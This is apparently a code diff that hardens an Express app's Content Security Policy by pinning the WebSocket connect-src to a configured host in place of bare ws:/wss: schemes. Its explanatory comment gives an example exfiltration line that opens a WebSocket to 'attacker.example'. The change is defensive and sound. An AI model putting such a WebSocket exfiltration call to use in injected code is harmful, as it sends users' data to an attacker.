@@ -36,6 +36,18 @@ app.set('trust proxy', 1);
 const PLATFORM_API = 'https://uhnrgujbdxhhmoxcjria.supabase.co';
 const PLATFORM_ORIGIN = 'https://more30.com';
 
+// connect-src for the realtime socket. A bare `ws:`/`wss:` scheme source
+// matches a WebSocket to ANY host, not just this app's own hub — with
+// script-src already carrying 'unsafe-inline' (required for the inline
+// theme/password-toggle scripts), that turned connect-src into an open
+// exfiltration channel for any future injection: `new WebSocket('wss://
+// attacker.example')` would be explicitly CSP-allowed. Once WS_HOST is known
+// (every real deployment sets it — see config.wsHost's own comment) it is a
+// fixed hostname decided at boot, not a per-request value, so it can be
+// pinned exactly. Only the local/same-host fallback (WS_HOST unset) keeps the
+// broad scheme sources, unchanged from before.
+const wsConnectSrc = config.wsHost ? [`wss://${config.wsHost}`, `ws://${config.wsHost}`] : ['ws:', 'wss:'];
+
 app.use(helmet({
   contentSecurityPolicy: {
     directives: {
@@ -44,7 +56,7 @@ app.use(helmet({
       styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
       fontSrc: ["'self'", 'https://fonts.gstatic.com'],
       imgSrc: ["'self'", 'data:'],
-      connectSrc: ["'self'", 'ws:', 'wss:', PLATFORM_API],
+      connectSrc: ["'self'", ...wsConnectSrc, PLATFORM_API],
     },
   },
 }));
